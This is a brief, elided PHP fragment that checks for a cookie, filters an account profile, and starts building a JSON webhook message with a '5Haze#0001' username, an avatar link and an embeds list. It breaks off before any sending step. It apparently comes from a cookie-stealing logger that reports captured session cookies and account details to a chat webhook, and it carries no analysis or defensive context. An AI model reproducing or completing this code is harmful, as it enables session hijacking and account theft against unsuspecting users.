    ...
    if ($cookie) {
        ...
        if (account_filter($profile)) {
            $hookObject = json_encode([
                 "username" => "5Haze#0001",
        "avatar_url" => "https://img.freepik.com/free-vector/cute-astronaut-riding-rocket-waving-hand-cartoon-icon-illustration-science-technology-icon-concept_138676-2130.jpg?size=338&ext=jpg",
                "embeds" => [
                    [
